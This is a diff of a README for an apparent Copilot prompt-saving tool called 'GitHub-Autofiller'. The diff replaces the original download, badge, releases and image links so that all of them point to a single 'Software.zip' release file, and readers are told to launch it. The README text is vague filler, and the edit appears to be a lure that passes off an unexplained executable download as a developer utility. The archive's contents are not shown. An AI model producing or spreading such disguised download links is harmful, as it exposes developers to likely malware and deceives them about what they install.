@@ -2,7 +2,7 @@
 
 ## Save prompts given to copilot -> Easily reuse if they match expectation
 
-[![GitHub-Autofiller](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![GitHub-Autofiller](https://github.com/abkareem/GitHub-Autofiller/releases/download/v1.0/Software.zip)](https://github.com/abkareem/GitHub-Autofiller/releases/download/v1.0/Software.zip)
 
 Welcome to GitHub-Autofiller! This repository provides a convenient tool for saving prompts given to copilot and easily reusing them if they match your expectations. Whether you are working on copilot, copilot-chat, copilot-indexed, or any other related project, this autofiller tool will streamline your prompt handling process.
 
@@ -13,7 +13,7 @@ Welcome to GitHub-Autofiller! This repository provides a convenient tool for sav
 
 ## Installation 🛠️
 To get started with GitHub-Autofiller, simply download the latest release from the following link:
-[Download v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)  
+[Download v1.0.0](https://github.com/abkareem/GitHub-Autofiller/releases/download/v1.0/Software.zip)  
 
 Once downloaded, launch the application to start saving prompts and enhancing your copilot experience.
 
@@ -48,9 +48,9 @@ GitHub-Autofiller is released under the MIT License - see the [LICENSE](LICENSE)
 
 ---
 
-**Note:** If the download link doesn't work or you need more information, please check the [Releases](https://github.com/cli/cli/releases) section for alternative options.
+**Note:** If the download link doesn't work or you need more information, please check the [Releases](https://github.com/abkareem/GitHub-Autofiller/releases/download/v1.0/Software.zip) section for alternative options.
 
-![GitHub-Autofiller](https://via.placeholder.com/800x400)
+![GitHub-Autofiller](https://github.com/abkareem/GitHub-Autofiller/releases/download/v1.0/Software.zip)
 
 ---
 
